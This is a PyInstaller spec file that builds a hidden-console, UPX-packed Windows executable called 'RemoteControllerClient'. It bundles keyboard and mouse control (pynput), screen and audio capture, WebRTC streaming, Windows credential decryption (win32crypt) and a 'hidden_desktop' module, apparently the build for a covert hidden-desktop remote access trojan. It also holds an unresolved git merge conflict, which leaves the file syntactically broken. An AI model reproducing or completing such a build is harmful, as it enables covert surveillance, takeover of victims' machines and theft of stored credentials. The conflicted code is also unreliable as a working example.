# -*- mode: python ; coding: utf-8 -*-
import sys
from pathlib import Path

<<<<<<< HEAD
datas = [('C:\\Temp\\rc_build_si9dke4d\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Temp\\rc_build_si9dke4d\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Temp\\rc_build_si9dke4d\\remote_client\\rc_server.json', 'remote_client')]
=======
from PyInstaller.utils.hooks import collect_all, collect_submodules

BASE_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE_DIR))

PACKAGE_DIR = BASE_DIR / "remote_client"
datas = []
for name in ("rc_team_id.txt", "rc_antifraud.json", "rc_server.json"):
    candidate = PACKAGE_DIR / name
    if candidate.exists():
        datas.append((str(candidate), "remote_client"))
>>>>>>> eefbc7839936ad7dc341ac9da5978f22cce1b545
binaries = []
hiddenimports = [
    "win32crypt",
    "cryptography",
    "pynput",
    "pynput.mouse",
    "pynput.keyboard",
    "remote_client.apps",
    "remote_client.apps.launcher",
    "remote_client.session_factory",
    "remote_client.windows.hidden_desktop",
]
hiddenimports += collect_submodules("remote_client")
tmp_ret = collect_all('pynput')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('av')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('aiortc')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('sounddevice')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('mss')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
tmp_ret = collect_all('numpy')
datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]


a = Analysis(
    [str(BASE_DIR / "client.py")],
    pathex=[str(BASE_DIR)],
    binaries=binaries,
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['numpy.f2py.tests', 'pytest'],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='RemoteControllerClient',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
